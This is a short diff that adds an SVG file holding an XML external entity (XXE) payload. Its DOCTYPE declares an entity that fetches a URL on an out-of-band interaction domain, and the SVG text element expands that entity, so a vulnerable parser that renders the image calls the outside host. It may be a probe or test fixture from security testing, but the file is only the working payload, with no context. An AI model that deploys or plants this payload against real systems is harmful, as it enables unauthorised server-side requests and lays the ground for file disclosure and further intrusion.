@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://lxznnazfucjmkqlkstozkjlwjoh1b8mig.oast.fun">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text y="20">&xxe;</text>
+</svg>
